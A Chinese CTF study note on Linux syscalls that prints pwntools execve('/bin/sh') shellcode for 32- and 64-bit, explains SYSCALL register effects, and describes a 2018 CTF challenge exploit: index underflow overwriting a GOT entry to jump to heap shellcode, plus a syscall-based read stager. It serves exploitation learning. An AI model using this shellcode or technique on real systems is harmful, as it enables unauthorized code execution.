# syscall

## syscall

### 系统调用号对应的表

[syscall64](https://syscalls64.paolostivanin.com/)

[syscall32](https://syscalls32.paolostivanin.com/)

### 32位 64位 getshell 汇编代码

#### 32 位
```
>>> context.arch = 'i386'
>>> print(shellcraft.execve('/bin/sh'))
    /* execve(path='/bin/sh', argv=0, envp=0) */
    /* push '/bin/sh\x00' */
    push 0x1010101
    xor dword ptr [esp], 0x169722e
    push 0x6e69622f
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    /* call execve() */
    push SYS_execve /* 0xb */
    pop eax
    int 0x80
```

eax = 0xb   ebx = addr("/bin/sh")  ecx = 0  edx = 0

#### 64 位
```
>>> context.arch = 'amd64'
>>> print(shellcraft.execve('/bin/sh'))
    /* execve(path='/bin/sh', argv=0, envp=0) */
    /* push '/bin/sh\x00' */
    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x68732f6e69622f
    xor [rsp], rax
    mov rdi, rsp
    xor edx, edx /* 0 */
    xor esi, esi /* 0 */
    /* call execve() */
    push SYS_execve /* 0x3b */
    pop rax
    syscall
```

rax = 0x3b  rdi = addr("/bin/sh")  rdx = 0  rsi = 0

### 系统调用时更改的寄存器

```
IF (CS.L ≠ 1 ) or (IA32_EFER.LMA ≠ 1) or (IA32_EFER.SCE ≠ 1)
(* Not in 64-Bit Mode or SYSCALL/SYSRET not enabled in IA32_EFER *)
    THEN #UD;
FI;
RCX ← RIP;
                            (* Will contain address of next instruction *)
RIP ← IA32_LSTAR;
R11 ← RFLAGS;
RFLAGS ← RFLAGS AND NOT(IA32_FMASK);
CS.Selector ← IA32_STAR[47:32] AND FFFCH (* Operating system provides CS; RPL forced to 0 *)
(* Set rest of CS to a fixed value *)
CS.Base ← 0;
                            (* Flat segment *)
CS.Limit ← FFFFFH;
                            (* With 4-KByte granularity, implies a 4-GByte limit *)
CS.Type ← 11;
                            (* Execute/read code, accessed *)
CS.S ← 1;
CS.DPL ← 0;
CS.P ← 1;
CS.L ← 1;
                            (* Entry is to 64-bit mode *)
CS.D ← 0;
                            (* Required if CS.L = 1 *)
CS.G ← 1;
                            (* 4-KByte granularity *)
CPL ← 0;
SS.Selector ← IA32_STAR[47:32] + 8;
                            (* SS just above CS *)
(* Set rest of SS to a fixed value *)
SS.Base ← 0;
                            (* Flat segment *)
SS.Limit ← FFFFFH;
                            (* With 4-KByte granularity, implies a 4-GByte limit *)
SS.Type ← 3;
                            (* Read/write data, accessed *)
SS.S ← 1;
SS.DPL ← 0;
SS.P ← 1;
SS.B ← 1;
                            (* 32-bit stack segment *)
SS.G ← 1;
                            (* 4-KByte granularity *)
```

值得注意的是 syscall 会用 rcx 记录下一条指令的值，如果程序允许你的输入在一个 rwxp 段，但是每次输入十分短的时候，可以通过 syscall 找到当前写入的地址进行续写

### 鹏程杯 2018 的 note 
note 中 got 表的部分 rwxp，heap 也为 rwxp ，若将 got 表的某一项覆盖成指向 shellcode 的 指针，即可 getshell <br/>

漏洞在于可以通过溢出覆盖 Array 的 idx ，进而下溢数组，覆盖 got 表某一项成 chunk 的地址，在调用该 got 的时候，跳转到 heap 上的 shellcode 运行汇编代码 <br/>

此题限制每次的写到 heap 上的长度小于 13 ，因此一种办法是将多个 heap 上的 shellcode 通过 asm("jmp addr") 拼接起来 ("\xEB" 是 jmp (-127 ~ +128) 的机器码，通过 gdb 或者 手推也能得到 "\xEB\x??" 的值) <br/>

这里想重点介绍一下 Whitzard 的做法，很巧妙运用 syscall ， 以下为 Whitezard 的关键汇编代码<br/>

```
start :
	xor rax, rax 
	syscall 
	dec edx
	mov rsi, rcx
	jmp start
```

最开始的时候由于输入限制只能 13 byte，因此控制不了 rsi，不能 read 到自己想要的地方，并且不能从现有的汇编代码跳转过去。但是可以通过 syscall 找到之前写入的地址，运用 edx 只取 rdx 的低 32 位，jmp (-127 ~ +128) 的值进行调用 SYS_read， 将 shellcode 续写在 syscall 后面，从而 getshell

[Syscall Operation](https://github.com/HJLebbink/asm-dude/wiki/SYSCALL)


